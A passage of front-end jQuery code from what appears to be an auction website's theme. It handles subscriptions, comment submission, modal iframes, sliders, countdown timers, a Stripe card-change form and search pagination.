              clickedPos = groupScrollOffsets[$thisItem.index()], clickedWidth = $thisItem.width() > 210 ? $thisItem.width() : 210, divPos = parseInt($arrows.scrollLeft()), isMobile = $(window).outerWidth() < 751, newPos = false, wrapWidth = $wrap.width();
              if (divPos > clickedPos) {
                newPos = 0 === clickedPos ? 0 : clickedPos - (isMobile ? 0 : 54);
              } else if (divPos + wrapWidth - (isMobile ? 78 : 0) < clickedPos + clickedWidth) {
                newPos = clickedPos + clickedWidth - wrapWidth + (isMobile ? 39 : 0);
              }
              if (newPos !== false) {
                $arrows.scrollLeft(newPos);
                divPos = parseInt($arrows.scrollLeft());
              }
              $thisItem.find('.group-item').css('margin-left', -divPos);
              $arrows.addClass('freeze');
            }
            groupsSizing();
          }, 50);
        }
      });
      $('.column-groups .group-item-wrap .view-all').click(function () {
        document.location.href = $(this).attr('href');
      });
    }
    $('.group-item-wrap .subscription-toggle').click(function (event) {
      event.preventDefault();
      if (!$(this).hasClass('poppable-link')) {
        var $groupItem = $(this).closest('.group-item-wrap'),
          watched = $groupItem.hasClass('watched');
        if (null !== timeout) {
          clearTimeout(timeout);
          timeout = null;
        }
        $(this).addClass('confirm');
        if (watched) {
          $(this).find('.button-text').text(BaT_Theme.textUnsubscribeConfirm);
          $(this).find('.bell-icon').removeClass('bell-icon-filled');
          $groupItem.removeClass('watched');
          $groupItem.find('button > .watch-bell > .bell-icon').remove();
        } else {
          $(this).find('.button-text').text(BaT_Theme.textSubscribeConfirm);
          $(this).find('.bell-icon').addClass('bell-icon-filled');
          $groupItem.addClass('watched');
          // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.html -- HTML is properly escaped.
          $groupItem.find('button > .watch-bell').html(BaT_Theme.watchBellHTML);
        }
        $.post($(this).attr('href'), {
          ajax: true,
          force: !watched
        }, function (data, status) {}, 'json');
        timeout = setTimeout(function () {
          $('.group-item-wrap .subscription-toggle.confirm').removeClass('confirm');
          $('.column-groups .group-item-wrap.open').removeClass('open').removeAttr('style');
          $('.column-groups .group-item').removeAttr('style');
          $('.column-groups-arrows.freeze').removeClass('freeze');
          groupsSizing();
        }, 2000);
      } else {
        var $link = $(this),
          href = $link.attr('href');
        $link.attr('target', 'poppable-target').attr('href', href + '&modal=modal');
        $poppableTarget.attr('src', $link.attr('href'));
        $.magnificPopup.open({
          callbacks: {
            beforeClose: function () {
              var iframeSrc = $poppableTarget.attr('src'),
                iframeTargetHasParams = iframeSrc.indexOf('?') >= 0,
                modifiedIframeSrc = iframeSrc + (iframeTargetHasParams ? '&' : '?') + 'closing_modal=closing_modal';
              $poppableTarget.attr('src', modifiedIframeSrc);
            }
          },
          items: {
            src: window.$poppableTarget,
            type: 'inline'
          }
        });
      }
    });
    $('.group-item-wrap .group-cover').click(function () {
      if (null !== timeout) {
        clearTimeout(timeout);
        timeout = null;
      }
    }).children().click(function (e) {
      return false;
    });
  })();

  // Model page subscription button
  (function () {
    $('#button-notifications').click(function (event) {
      event.preventDefault();
      var $this = $(this),
        handle = $this.data('handle');
      handle = 'undefined' === typeof handle ? null : handle;
      if (null !== handle) {
        clearTimeout(handle);
        $this.data('handle', null);
      }
      if (!$this.hasClass('poppable-link')) {
        $this.data('watched', 'yes' === $this.data('watched') ? 'no' : 'yes');
        $this.text('yes' === $this.data('watched') ? $this.data('toggled-on') : $this.data('toggled-off'));
        handle = setTimeout(function () {
          $.post($this.attr('href'), {
            ajax: true,
            force: $this.data('watched')
          }, function (data, status) {}, 'json');
        }, 750);
        $this.data('handle', handle);
      }
    });
  })();

  // Subscribe to Model from the Make Page -- subscription button
  addModelSubscribe();

  // General non-link clickable elements
  (function () {
    $(document).on('click', '[data-clickable-element]', function (event) {
      event.preventDefault();
      document.location.href = $(this).data('clickable-element');
    });
  })();

  // Checkbox table
  (function () {
    $(document).on('change', '.bat-col-checkbox input[type="checkbox"]', function (event) {
      var $this = $(this),
        index = $this.parents('th').index();
      $this.parents('table').find('tbody tr').find('td:eq(' + index + ') input[type="checkbox"]').prop('checked', $this.prop('checked'));
    });
  })();

  // Image voting
  (function () {
    $(document).on('dblclick', '.image-vote-container', function (event) {
      $(this).find('.image-vote a').click();
    }).on('click', '.image-vote a, .pswp__button--votes a', function (event) {
      var $this = $(this),
        // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.append -- HTML is properly escaped.
        $span = $('<span class="comment-actions-approve"></span>').html($this.html()),
        item_id = $this.find('[data-votes-id]').data('votes-id'),
        url = $this.is('a') ? $this.attr('href') : $this.data('href');
      if ($this.parents('body.logged-in').length > 0) {
        event.preventDefault();
        $.get(url, {
          ajax: true
        }, function (data, status) {}, 'json');
        $('[data-votes-id="' + item_id + '"]').parents('a, button').replaceWith($span.get(0).outerHTML);
        for (var i = 0; i < window.galleryItems.length; i++) {
          var item = window.galleryItems[i];
          if (item.id == item_id) {
            item.voted = true;
          }
        }
      } else {/* do nothing because we want link clicks to propagate appropriately */}
    });
  })();

  // Items container with a "show more" button
  (function () {
    $('.items-more[data-threshold]').each(function (index, element) {
      var $element = $(element),
        $container = $element.siblings('.items-container'),
        $items = $container.find('> *'),
        $button = $element.find('.button-show-more'),
        threshold = $element.data('threshold');
      $items.filter(':gt(' + (threshold - 1) + ')').hide();
      $button.click(function (event) {
        event.preventDefault();
        $container.removeClass('more-items-available');
        $items.show();
        $element.remove();
      });
    });
  })();

  // Model threshold
  (function () {
    $('.previous-listings-more[data-threshold]').each(function (index, element) {
      var $element = $(element),
        $container = $element.prev('.previous-listings'),
        $items = $container.find('> *'),
        $button = $element.find('a.page-numbers'),
        threshold = $element.data('threshold');
      $items.filter(':gt(' + (threshold - 1) + ')').hide();
      $button.click(function (event) {
        event.preventDefault();
        $items.show();
        $element.remove();
      });
    });
  })();

  // Modal pop immediately
  (function () {
    var $pops = $('[data-pop-immediately]');
    if ($pops.length > 0) {
      $.magnificPopup.open({
        items: {
          src: $pops.first().html(),
          type: 'inline'
        }
      });
    }
  })();

  // Moderate comments
  (function () {
    $(document).on('click', '.moderate-comments-toggle', function (event) {
      event.preventDefault();
      var $button = $(this);
      $button.prop('disabled', true);
      $.post(BaT_Theme.ajaxUrl, {
        action: BaT_Theme.ajaxActionToggleModerateComments,
        item: BaT_Theme.post
      }, function (data, status) {}, 'json');
    });
  })();

  // Slideable cards
  (function () {
    var initializeSwiper = function ($cardsContainer) {
      $cardsContainer.addClass('swiper-container');
      $cardsContainer.find('.bat-cards-wrapper').addClass('swiper-wrapper');
      $cardsContainer.find('.bat-card').addClass('swiper-slide');
      var swiper = new Swiper($cardsContainer.get(0), {
        centeredSlides: true,
        slidesPerView: 'auto',
        spaceBetween: 20,
        pagination: {
          el: '.swiper-pagination'
        }
      });
      return swiper;
    };
    var destroySwiper = function ($cardsContainer, swiper) {
      swiper.destroy();
      $cardsContainer.removeClass('swiper-container');
      $cardsContainer.find('.bat-cards-wrapper').removeClass('swiper-wrapper');
      $cardsContainer.find('.bat-card').removeClass('swiper-slide');
    };
    var optionSwiper = false,
      graphicSwiper = false;
    $(window).on('resize', function (event) {
      var $window = $(window),
        $cardsContainers = $('.bat-cards-container'),
        $optionContainer = $('#bat-submit-option-slider');
      $graphicContainer = $('#bat-submit-graphic-slider');
      widthCurrent = $window.outerWidth(), isMobile = widthCurrent < 751;
      $cardsContainers.toggleClass('bat-cards-container-mobile', isMobile);
      if ($optionContainer.length && $graphicContainer.length) {
        if (isMobile && !optionSwiper && !graphicSwiper) {
          optionSwiper = initializeSwiper($optionContainer);
          graphicSwiper = initializeSwiper($graphicContainer);

          // Set option and graphic sliders to slide together
          optionSwiper.controller.control = graphicSwiper;
          graphicSwiper.controller.control = optionSwiper;
        } else if (!isMobile && optionSwiper && graphicSwiper) {
          destroySwiper($optionContainer, optionSwiper);
          optionSwiper = false;
          destroySwiper($graphicContainer, graphicSwiper);
          graphicSwiper = false;
        }
      }
    }).trigger('resize');
  })();

  // Pills
  (function () {
    var $pills = $('.bat-pills');
    $pills.each(function (index, container) {
      var $container = $(container),
        $toolbar = $container.find('.bat-pills-toolbar'),
        $buttons = $toolbar.find('.bat-pill'),
        $contents = $container.find('.bat-pill-content').hide();
      $buttons.on('click', function (event) {
        event.preventDefault();
        var $button = $(this),
          $content = $contents.filter($button.attr('href'));
        $buttons.not($button).removeClass('bat-pill-active');
        $contents.not($content).hide();
        $button.addClass('bat-pill-active');
        $content.show();
      }).filter('.bat-pill-active').first().trigger('click');
    });
  })();

  // Drop items
  (function () {
    var clipboard = new Clipboard('.panel-body a[data-clipboard-text]');
    clipboard.on('success', function (event) {
      var $copyNotification = $(event.trigger).closest('.panel-body').find('.copy-notification'),
        copyAnimation = $copyNotification.data('copy-animation');
      if (copyAnimation) {
        clearTimeout(copyAnimation);
      }
      $copyNotification.css('opacity', 1);
      $copyNotification.data('copy-animation', setTimeout(function () {
        $copyNotification.css('opacity', 0);
        $copyNotification.data('copy-animation', false);
      }, 1200));
    });
    $('.panel-body a[data-clipboard-text]').click(function (event) {
      event.preventDefault();
    });

    // phpcs:ignore WordPressVIPMinimum.JS.Window.VarAssignment -- No unsafe usage of window.location.href.
    var url = window.location.href,
      re = new RegExp("#collapse-.*?(&|$)", "i");
    if (url.match(re)) {
      $(url.match(re)[0]).addClass('in');
      $(url.match(re)[0]).parent().find('.icn-toggle').removeClass('fa-chevron-down').addClass('fa-chevron-up');
      $('html, body').animate({
        scrollTop: $(url.match(re)[0]).offset().top - 65
      }, 500);
    }
    $('.panel-heading').click(function () {
      var targetIndex = $(this).data('target');
      if (url.match(re)) {
        url = url.replace(re, targetIndex);
        history.pushState({
          tab: targetIndex
        }, null, url);
      } else {
        url = url + targetIndex;
        history.replaceState({
          tab: targetIndex
        }, null, url);
      }
      $(this).find('i').toggleClass('fa-chevron-down').toggleClass('fa-chevron-up');
    });
  })();

  // Recent bids header thing
  BaT_Theme.recentBidsCountdowns();
  $(document).on('touchend', '.recent-bids-list-item a', function (event) {
    $(this).data('touched', true);
  }).on('mouseenter', '.recent-bids-list-item', function (event) {
    var $this = $(this);
    if (!$this.find('a').data('touched')) {
      $('.recent-bids-list-item').removeClass('recent-bids-list-item-active');
      $this.addClass('recent-bids-list-item-active');
      var bid = $(this).data('bid'),
        $image = $('.recent-bids-image-link[data-bid="' + bid + '"]').remove().prependTo('.recent-bids-image-links').show();
    }
  });

  // Mobile footer slide
  $('.footer-nav-toggle').click(function (event) {
    event.preventDefault();
    $('.footer-nav').slideToggle();
  });

  // Mobile category text
  if ($(window).width() < 452) {
    $('.toolbar-cats select #all-cats').text($('.toolbar-cats select #all-cats').data('cat-name'));
  }

  // When a user interacts with the comment box and they leave a comment that looks like a bid,
  // a popup appears that the user can dismiss by indicating they indeed did mean to leave a comment.
  $(document).on('click', '.cancel-comment', function (event) {
    event.preventDefault();
    $.magnificPopup.close();
  }).on('click', '.continue-comment', function (event) {
    event.preventDefault();
    $.magnificPopup.close();
    $('#comments-form').data('confirmed-as-comment', true).submit();
  });

  // When a comment is submitted, do a few things:
  // 1. Check to see if it looks like a bid and hasn't been previously confirmed as not a bid -
  // if it looks like a bid, pop up a modal
  // 2. Submit the comment and wait for the response - when response arrives, enable comment submission again
  $('.comments-form-container-logged-in #comments-form').on('submit', function (event) {
    var $this = $(this),
      $textarea = $this.find('textarea'),
      $comments = $this.parents('#comments');
    event.preventDefault();
    if ($.trim($textarea.val()).match(/^[$,\d\.]+$/) && !$this.data('confirmed-as-comment')) {
      $.magnificPopup.open({
        items: {
          src: $('#comment-confirmation-modal-container').html(),
          type: 'inline'
        }
      });
    } else {
      // Avoid submit when the comment has videos with errors
      if ($('.bat-video-submission .hasError').length > 0) {
        $('.submit-fail').show();
        return;
      } else {
        $('.submit-fail').hide();
      }
      $textarea.prop('readonly', true);
      if ($this.data('uploading')) {
        $this.data('submitted', true);
        $this.find('input[type="submit"]').prop('disabled', true).val(BaT_Listings_Submission.textWaiting);
        return;
      }
      $this.ajaxSubmit({
        data: {
          ajax_submission: 'true'
        },
        dataType: 'json',
        beforeSubmit: function (arr, $form, options) {
          $form.find('input[type="submit"]').prop('disabled', true).val(BaT_Theme.textCommentSubmitting);
          $('.bat-listings-listings-gallery-dropper').removeClass('dropper__contents').addClass('no_drop');
          $('.bat-listings-listings-gallery-dropper .listing_button_select_files').text('').attr('disable', true);
          $('.bat-listings-listings-image-uploads-item-close').hide();
          $('#comments-form-error').hide();
        },
        error: function (xhr, status, text) {
          if (xhr.status === 400 && xhr.responseJSON && xhr.responseJSON.message) {
            // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.html -- HTML provided from wp-comments-post.php is properly escaped.
            $('#comments-form-error').hide().html(xhr.responseJSON.message).slideDown();
            $this.find('textarea').prop('readonly', false);
            $this.find('input[type="submit"]').prop('disabled', false).val('Submit');
          } else {
            $this.get(0).submit();
            $textarea.prop('readonly', false);
          }

          // send and failure event to New Relic when there's an error with the comment submission.
          BaT_Theme.newRelicSendEvent('user_listing_comment_failure', {
            status_code: xhr.status,
            error_message: xhr.responseJSON.message
          });
        },
        success: function (data, status, xhr, $form) {
          $(document).trigger('bat.comment.submitted');
          $form.data('confirmed-as-comment', false).data('submitted', false);
          $form.find('textarea').val('').prop('readonly', false);
          $form.find('input[type="submit"]').prop('disabled', false).val('Submit');
          var selectFilesText = BaT_Theme.textDragMobile;
          if ($(window).width() > 768) {
            selectFilesText = BaT_Theme.textDragBrowse;
          }

          // Reset gallery dropper
          $('.bat-comment-media-buttons').show();
          $('.bat-listings-listings-form-listings-photos').hide();
          $('.bat-listings-listings-gallery-dropper').removeClass('no_drop');
          $('.bat-listings-listings-gallery-dropper .listing_button_select_files').text(selectFilesText).attr('disable', false);
          $('#comments-form .comment-image-id').remove();
          $('.bat-listings-listings-image-uploads li').not('.bat-listings-listings-gallery-dropper').remove();
          if ('undefined' !== typeof _gaq) {
            _gaq.push(['_trackEvent', 'comment-posted', 'comment-posted']);
          }
          var CLVM = 'undefined' !== typeof BAT_VMS && 'undefined' !== typeof BAT_VMS.CLVM ? BAT_VMS.CLVM : false;
          if (data.comment && 0 === parseInt(data.comment.approved) && data.comment.pendingType && CLVM) {
            // Add moderated comments to the local comment view model
            CLVM.addComment(data.comment, true);
          }
        }
      });
    }
  });

  // When a comment is submitted without a user logged in, do a two things:
  // 1. Build a redirect URL
  // 2. Open the login modal
  $('.comments-form-container-logged-out #comments-form').on('submit', function (event) {
    var $this = $(this),
      currentPageUrl,
      URL,
      commentContent,
      $textarea = $this.find('textarea');

    // Get base64 encoded version of comment
    commentContent = window.btoa($textarea.val());

    // Get the current listing's URL to redirect to after login or signup
    if (BaT_Theme.currentUrl.indexOf('?') > -1) {
      currentPageUrl = BaT_Theme.currentUrl + '&comment_content=' + commentContent;
    } else {
      currentPageUrl = BaT_Theme.currentUrl + '?comment_content=' + commentContent;
    }
    currentPageUrl = currentPageUrl + '#comments';

    // Build the URL with the encoded comment and current listing URL
    URL = BaT_Theme.loginUrl + '?modal=modal&comment_content=' + commentContent + '&redirect=' + encodeURIComponent(currentPageUrl);

    // Open the login modal in an iframe
    $.magnificPopup.open({
      items: {
        src: URL,
        type: 'iframe'
      },
      iframe: {
        markup: '<div><iframe class="mfp-iframe poppable" name="poppable-target" id="bat-poppable-target" frameborder="0"></iframe></div>'
      }
    });
    event.preventDefault();
  });

  // Allow subscriptions to comment by clicking a link
  $(document).on('click', '.comment-subscribe', function (event) {
    event.preventDefault();
    var $this = $(this),
      $parent = $this.parents('.subscribe-to-comments');
    if ('yes' !== $this.data('subscribing-to-comment')) {
      $this.data('subscribing-to-comment', 'yes');
      $.get($this.attr('href'), {
        ajax: 1
      }, function (data) {
        // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.replaceWith -- HTML is properly escaped.
        $parent.replaceWith(data.replacement);
      }, 'json');
    }
  });

  // Open new windows when share links are cliekd (Twitter, Facebook, Google+)
  $('.post-share-link[data-share-height][data-share-width]').click(function (event) {
    event.preventDefault();
    var $this = $(this);
    window.open($this.attr('href'), $this.attr('class'), 'height=' + $this.data('share-height') + ',width=' + $this.data('share-width'));
  });

  // Share via Email form submission
  $('form.bat-listings-mail-to-friend-form').on('submit', function (e) {
    var $form = $(this);
    var $input = $form.find('input[name="bat-listings-mail-to-friend[g-recaptcha-response]"]');
    if (!$input.val()) {
      e.preventDefault();
      BaT_Theme.getRecaptchaToken(() => $form.submit(), $input);
    }
  });

  // When a user subscribes to the mailing list, submit via AJAX
  $('form.constant-contact-form').on('submit', function (e) {
    var $form = $(this);
    e.preventDefault();
    var $input = $('form.constant-contact-form input[name="g-recaptcha-response"]');
    BaT_Theme.getRecaptchaToken(function () {
      $form.ajaxSubmit({
        beforeSubmit: function (formData, formObject, formOptions) {
          formData.push({
            name: 'ajax',
            value: 'ajax',
            type: 'hidden'
          });
          $('form.constant-contact-form .error').remove();
          $(formObject).find('[type="submit"]').attr('disabled', 'disabled');
        },
        success: function (response, status, xhr, $form) {
          var $inputField = $('form.constant-contact-form .constant-contact-form-submit');
          if (status === 'error' || response.errors && response.errors.length > 0) {
            $form.find('[type="submit"]').removeAttr('disabled');
          }
          if (status === 'error') {
            $inputField.after(BAT_SUBSCRIBE_PAGE.emailNetworkError);
          } else if (response.errors && response.errors.length > 0) {
            response.errors.forEach(errorMessage => $inputField.after('<span class="error">' + errorMessage + '</span>'));
          } else {
            $('.bat-theme-widget-constant-contact p').hide();
            $form.empty().append('<div class="notice">' + BaT_Theme.constantContactFormSubmissionText + '</div>');
            setTimeout(function () {
              $.magnificPopup.close();
            }, 3500);
          }
        }
      });
    }, $input);
  });
  $('.auction-ends-disclaimer-toggle').click(function (event) {
    event.preventDefault();
    $(this).parent().siblings('.auctions-ends-disclaimer-text').toggle();
  });

  // Countdown timer
  BaT_Theme.countdownTimer = function () {
    $('[data-auction-ends]').each(function (index, ends) {
      var $ends = $(ends),
        layout = $ends.data('layout') ? $ends.data('layout') : '{d<}{dn} {dl}, {d>} {h<}{hn} {hl}, {h>} {m<}{mn} {ml}, {m>} {sn} {sl}',
        parts = $ends.data('auction-ends').split('-'),
        until = new Date(Date.UTC(parseInt(parts[0]), parseInt(parts[1]) - 1, parseInt(parts[2]), parseInt(parts[3]), parseInt(parts[4]), parseInt(parts[5]), 0));
      $ends.countdown({
        alwaysExpire: true,
        onExpiry: function () {
          if ($ends.siblings('.listing-end-processing-notice').size()) {
            $ends.siblings('.listing-end-processing-notice').show();
            $ends.hide();
          }
        },
        format: 'ydhms',
        labels: ['years', 'months', 'weeks', 'days', 'hours', 'minutes', 'seconds'],
        labels1: ['year', 'month', 'week', 'day', 'hour', 'minute', 'second'],
        layout: layout,
        until: until
      });
    });
  };
  BaT_Theme.countdownTimer();
  $('#bat-listings-confirm-bid-form').on('submit', function (event) {
    $('#bat-listings-listings-place').prop('disabled', true);
  });

  // Generic modal HTML editing
  if ($('meta[name="modal"][value="yes"]').length > 0) {
    $('form').each(function (index, form) {
      var $form = $(form);
      $form.append('<input type="hidden" name="modal" value="modal" />');
    });
    $('.close-modal').click(function (event) {
      var parent = window.parent;
      if (parent && parent !== window) {
        event.preventDefault();
        if (parent.postMessage) {
          parent.postMessage({
            closeWindow: true
          }, '*');
        } else {
          parent.jQuery.magnificPopup.close();
        }
      }
    });
    $('.refresh-page').click(function (event) {
      event.preventDefault();
      var parent = window.parent;
      parent.document.location.reload();
    });
    $('a.non-modal-link').click(function (event) {
      event.preventDefault();
      var url = $(this).attr('href'),
        parent = window.parent;
      parent.document.location.href = url;
    });
    setTimeout(function () {
      var height = Math.min($(window.parent).outerHeight(), $('body').outerHeight()),
        width = Math.min($(window.parent).outerWidth() - 40, 480);
      var parent = window.parent;
      if (parent && parent.postMessage) {
        parent.postMessage({
          height: height,
          width: width
        }, '*');
      }
    }, 250);
  } else {
    var $poppableTarget = $('<iframe class="poppable mfp-hide" name="poppable-target" id="bat-poppable-target"></iframe>').appendTo($('body'));
    window.addEventListener('message', function (event) {
      if (event.data && event.data.height) {
        $poppableTarget.height(event.data.height);
      } else if (event.data && event.data.closeWindow) {
        if ($poppableTarget.data('nextModalUrl')) {
          $poppableTarget.attr('src', $poppableTarget.data('nextModalUrl'));
          $poppableTarget.data('nextModalUrl', '');
        } else {
          jQuery.magnificPopup.close();
        }
      }
    }, false);
    window.$poppableTarget = $poppableTarget;
    $(document).on('click', '.poppable-link', function (event) {
      event.preventDefault();
      var $link = $(this),
        href = $link.attr('href'),
        hrefHasModal = href.indexOf('modal=') >= 0,
        hrefHasParams = href.indexOf('?') >= 0,
        nextModalHref = $link.data('nextModalUrl');
      $link.attr('target', 'poppable-target');
      if (!hrefHasModal) {
        $link.attr('href', href + (hrefHasParams ? '&' : '?') + 'modal=modal');
      }
      $poppableTarget.attr('src', $link.attr('href'));
      if (nextModalHref) {
        var nextHasModal = nextModalHref.indexOf('modal=') >= 0,
          nextHasParams = nextModalHref.indexOf('?') >= 0;
        if (!nextHasModal) {
          nextModalHref = nextModalHref + (nextHasParams ? '&' : '?') + 'modal=modal';
        }
        $poppableTarget.data('nextModalUrl', nextModalHref);
      }
      $.magnificPopup.open({
        callbacks: {
          beforeClose: function () {
            // jQuery.magnificPopup.close() causes the iframe to reload in background.
            // Mark the second load with a special query string to detect when the load is invisible to the user.
            var iframeSrc = $poppableTarget.attr('src'),
              iframeTargetHasParams = iframeSrc.indexOf('?') >= 0,
              modifiedIframeSrc = iframeSrc + (iframeTargetHasParams ? '&' : '?') + 'closing_modal=closing_modal';
            $poppableTarget.attr('src', modifiedIframeSrc);
          }
        },
        items: {
          src: window.$poppableTarget,
          type: 'inline'
        }
      });
    });
    $('.poppable-form').each(function (index, form) {
      var $form = $(form);
      $form.attr('target', 'poppable-target');
      $form.append('<input type="hidden" name="modal" value="modal" />');
    }).on('submit', function (event) {
      var $form = $(this);
      $.magnificPopup.open({
        items: {
          src: $poppableTarget,
          type: 'inline'
        }
      });
    });
    $('.listing-bid-form').on('submit', function (event) {
      setTimeout(function () {
        $('#bat-listings-listings-amount').val('');
      }, 1000);
    });
    if ('1' == $('#poppable-link-reminder-toggle').val()) {
      $('#poppable-link-reminder').trigger('click');
    }
    if ('1' == $('#poppable-link-contact-toggle').val()) {
      $('#poppable-link-contact').trigger('click');
    }
  }
  $(document).on('click', '#results-box-close-button', function (event) {
    event.preventDefault();
    $('#listing-actions-results-container').hide();
    $.post(BaT_Theme.ajaxUrl, {
      action: BaT_Theme.ajaxActionDismissListingResultsBox,
      listing: BaT_Theme.post
    }, function (data) {}, 'json');
  });
  (function () {
    // initialize slider for featured listings
    BaT_Theme.featuredListingsSliders = function () {
      var touchEndTimeout;
      var featuredSwiper = new Swiper('.featured-items-swiper .swiper-container', {
        a11y: true,
        autoplay: {
          delay: 3000
        },
        loop: false,
        longSwipesMs: 50,
        longSwipesRatio: 0.02,
        shortSwipes: false,
        navigation: {
          nextEl: '.listings-slider-control.right .arrow-box',
          prevEl: '.listings-slider-control.left .arrow-box'
        },
        watchOverflow: true,
        on: {
          init: function () {
            $('.featured-items-swiper .featured-listing').addClass('featured-listing-processed');
          },
          touchEnd: function () {
            clearTimeout(touchEndTimeout);
            touchEndTimeout = setTimeout(function () {
              $(featuredSwiper.$el).removeClass('hover');
            }, 3000);
          },
          touchStart: function () {
            clearTimeout(touchEndTimeout);
            $(featuredSwiper.$el).addClass('hover');
          }
        }
      });
    };
    BaT_Theme.featuredListingsSliders();
    BaT_Theme.featuredListingsCountdown();
  })();
  (function () {
    // initialize slider for popular listings
    BaT_Theme.popularListingsSliders = function () {
      var touchEndTimeout;
      var popularSwiper = new Swiper('.popular-listings-module .swiper-container', {
        a11y: true,
        loop: true,
        longSwipesMs: 50,
        longSwipesRatio: 0.02,
        slidesPerGroup: 4,
        slidesPerView: 'auto',
        spaceBetween: 20,
        shortSwipes: false,
        navigation: {
          nextEl: '.listings-slider-control.right .arrow-box',
          prevEl: '.listings-slider-control.left .arrow-box'
        },
        watchOverflow: true,
        breakpoints: {
          485: {
            slidesPerGroup: 1
          },
          725: {
            slidesPerGroup: 2
          },
          965: {
            slidesPerGroup: 3
          }
        },
        on: {
          touchEnd: function () {
            clearTimeout(touchEndTimeout);
            touchEndTimeout = setTimeout(function () {
              $(popularSwiper.$el).removeClass('hover');
            }, 3000);
          },
          touchStart: function () {
            clearTimeout(touchEndTimeout);
            $(popularSwiper.$el).addClass('hover');
          }
        }
      });
    };
    BaT_Theme.popularListingsSliders();
  })();
  (function () {
    // initialize slider for exceptional listings
    BaT_Theme.exceptionalListingsSliders = function () {
      var touchEndTimeout;
      var exceptionalSwiper = new Swiper('.exceptional-listings-module .swiper-container', {
        a11y: true,
        loop: true,
        longSwipesMs: 50,
        longSwipesRatio: 0.02,
        slidesPerGroup: 4,
        slidesPerView: 'auto',
        spaceBetween: 20,
        shortSwipes: false,
        navigation: {
          nextEl: '.listings-slider-control.right .arrow-box',
          prevEl: '.listings-slider-control.left .arrow-box'
        },
        watchOverflow: true,
        breakpoints: {
          485: {
            slidesPerGroup: 1
          },
          725: {
            slidesPerGroup: 2
          },
          965: {
            slidesPerGroup: 3
          }
        },
        on: {
          touchEnd: function () {
            clearTimeout(touchEndTimeout);
            touchEndTimeout = setTimeout(function () {
              $(exceptionalSwiper.$el).removeClass('hover');
            }, 3000);
          },
          touchStart: function () {
            clearTimeout(touchEndTimeout);
            $(exceptionalSwiper.$el).addClass('hover');
          }
        }
      });
    };
    BaT_Theme.exceptionalListingsSliders();
  })();
  $('.gallery-item-more').click(function (event) {
    event.preventDefault();
    event.stopPropagation();
    var $this = $(this),
      $img = $this.find('img.gallery-image-more'),
      $cover = $this.find('.gallery-item-more-cover'),
      $text = $this.find('.gallery-item-more-text'),
      $clear = $('.gallery-clear'),
      morePhotoData = photoGallery.getMoreImageData(),
      template = $('#gallery-item-more-template').html();
    $cover.remove();
    $text.remove();
    $img.removeClass('gallery-image-more');
    $this.removeClass('gallery-item-more');
    $this.off(event);
    for (var i = 0; i < morePhotoData.length; i++) {
      var $item = $(template.replace(/#context/g, morePhotoData[i].context).replace(/#dimensions/g, morePhotoData[i].dimensions).replace(/#id/g, morePhotoData[i].id).replace(/#large/g, morePhotoData[i].large).replace(/#small/g, morePhotoData[i].small).replace(/#voted/g, morePhotoData[i].voted).replace(/#votes/g, morePhotoData[i].votes));
      $item.insertBefore($clear);
    }
  });
  $(document).on('click', '.bat-listings-listings-form-change', function (event) {
    event.preventDefault();
    var $modal = $('#modal-listing-fee-change-credit-card'),
      $form = $modal.find('form'),
      $controlGroup = $form.find('#control-group-credit-card'),
      $expMonth = $form.find('#bat-listings-credit-card-expiration-month'),
      $expYear = $form.find('#bat-listings-credit-card-expiration-year'),
      $csv = $form.find('#bat-listings-credit-card-cvc'),
      $creditCard = $form.find('#bat-listings-credit-card-number'),
      $submit = $form.find('input[type="submit"]');

    // Show any previously hidden payment fields
    $form.find('.control-group-payment').show();

    // Reset values of all inputs
    $creditCard.attr('disabled', false).val('');
    $submit.attr('disabled', false);
    $expMonth.val('');
    $expYear.val('');
    $csv.val('');

    // Remove errors
    $form.find('.notice.error').hide();
    $controlGroup.find('label.control-group-error').remove();

    // Clear previously added payment methods from form data
    $form.find('#bat-listings-stripe-successful-payment-method-id').val('');
    BAT.modal.show('#modal-listing-fee-change-credit-card');
  });
  $('#bat-modal-change-credit-card-form').on('stripe-setup-card-without-payment-success', function (event, response) {
    var $modalForm = $(this),
      $paymentForm = $('#bat-listings-form-pay-listing-fee'),
      data = response.data;

    // Reset modal Stripe intent secret
    $modalForm.find('#bat-listings-stripe-setup-intent').val(data.setupIntentClientSecret);

    // Update card last four to match new setup
    $('#bat-listings-card-last-four-digits').text(data.cardLastFour);

    // Remove main payment form errors
    $('#bat-listings-error-notice').hide();
    $paymentForm.find('label.control-group-error').remove();

    // Add successful update message
    if ($('#bat-listings-card-success').length === 0) {
      $('<div class="notice notice-success" id="bat-listings-card-success"><p>' + data.message + '</p></div>').insertAfter($('#bat-listings-listings-payment-notice'));
    }
    BAT.modal.hide('#modal-listing-fee-change-credit-card');
  });
  $('#bat-listings-form-pay-listing-fee').on('stripe-existing-card-payment-failure', function (event, response) {
    // Hide previous success messages if present on payment failure
    $('.notice.notice-success').hide();
  });
  (function () {
    $('.comments-time-check').each(function (index, check) {
      var $check = $(check),
        timeB = parseInt(new Date().getTime() / 1000),
        timeR = $check.data('timestamp'),
        timeD = Math.abs(timeR - timeB);
      if (timeD > BaT_Theme.timeThreshold) {
        $check.show();
        $.post(BaT_Theme.ajaxUrl, {
          action: 'bat_check_time',
          nonce: BaT_Theme.ajaxCheckTimeNonce,
          post: BaT_Theme.post,
          timeB: timeB,
          timeR: timeR
        }, function () {}, 'json');
      }
    });
  })();
  var searchPreviousAuctionsPaginationSelector = '.search-results-auctions .pagination';
  var searchPreviousAuctionsItemListSelector = '.search-results-auctions .previous-listings-search';
  var searchPreviousAuctionsItemSelector = '.listing-card';
  addInlinePagination(searchPreviousAuctionsPaginationSelector, searchPreviousAuctionsItemListSelector, searchPreviousAuctionsItemSelector, 'Loading more auctions&hellip;');
  var searchStoriesPaginationSelector = '.search-results-stories .pagination';
  var searchStoriesItemListSelector = '.stories-list';
  var searchStoriesItemSelector = '.previous-listing';
  addInlinePagination(searchStoriesPaginationSelector, searchStoriesItemListSelector, searchStoriesItemSelector, 'Loading more stories&hellip;');
  var searchKeywordPagesPaginationSelector = '.search-results-keyword-pages .pagination';
  var searchKeywordPagesItemListSelector = '.search-results-keyword-pages .previous-listings-search';
  var searchKeywordPagesItemSelector = '.previous-listing';
  addInlinePagination(searchKeywordPagesPaginationSelector, searchKeywordPagesItemListSelector, searchKeywordPagesItemSelector, 'Loading more results&hellip;');
